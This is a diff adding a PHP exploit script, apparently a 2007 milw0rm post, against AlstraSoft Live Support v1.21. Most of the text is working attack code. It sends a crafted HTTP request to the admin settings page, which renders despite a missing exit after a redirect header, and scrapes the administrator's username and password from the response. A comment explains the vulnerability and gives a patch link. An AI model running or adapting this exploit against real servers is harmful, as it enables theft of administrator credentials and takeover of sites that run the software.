@@ -1,0 +1,153 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?
+echo "
+AlstraSoft Live Support v1.21 Admin Credential Retrieve Exploit
+by BlackHawk <hawkgotyou@gmail.com> <http://itablackhawk.altervista.org>
+Thanks to rgod for the php code and Marty for the Love
+
+";
+if ($argc<2) {
+echo "Usage: php ".$argv[0]." Host Path 
+Host:          target server (ip/hostname)
+Path:          path of LiveSupport
+
+Example:
+php ".$argv[0]." localhost /LiveSupport/ ";
+
+die;
+}
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+/*
+ ___________________________________________________________________
+/       This script is part of the AlstraSoft Exploit Pack:         \
+|                                                                   |
+|  http://itablackhawk.altervista.org/exploit/alsoft_exploit_pack;  |
+|                                                                   |
+|            You can find the patches for this bugs at:             |
+|                                                                   |
+|   http://itablackhawk.altervista.org/download/alsoft_patch.zip    |
+|                                                                   |
+\________________________.:BlackHawk 2007:._________________________/
+
+*/
+
+/*
+VULN EXPLANATION
+
+Exploitable code is located in common.php:
+
+function check_security($is_admin=0)
+{
+	$redirect = false;
+	
+	if($is_admin&&!get_session("admin"))
+		$redirect = true;
+	elseif(!get_session("login")&&!$is_admin)
+		$redirect = true;
+	
+	if($redirect)
+		header ("Location: index.php?querystring=" . urlencode(getenv("QUERY_STRING")) . "&ret_page=" . urlencode(getenv("REQUEST_URI")));
+}
+
+no exit function after header() function..
+
+this script simply call the page and extract admin credentials
+
+*/
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+}
+
+$host=$argv[1];
+$path=$argv[2];
+
+$port=80;
+$proxy="";
+
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+
+echo "- Getting the Page..\r\n";
+$packet="GET ".$p."admin/managesettings.php? HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Cookie: \r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+
+$temp=explode("name=\"password\" maxlength=\"30\" size=\"30\" value=\"", $html);
+$password=explode("\">", $temp[1]);
+$temp=explode("name=\"login\" maxlength=\"30\" size=\"30\" value=\"", $html);
+$login=explode("\">", $temp[1]);
+
+echo "- Ok, all done..
+Now use this settings to login:
+
+---------------
+
+NickName: $login[0]
+
+Password: $password[0]
+
+---------------
+";
+
+# Coded With BH Fast Generator v0.1
+?>
+
+# milw0rm.com [2007-05-20]
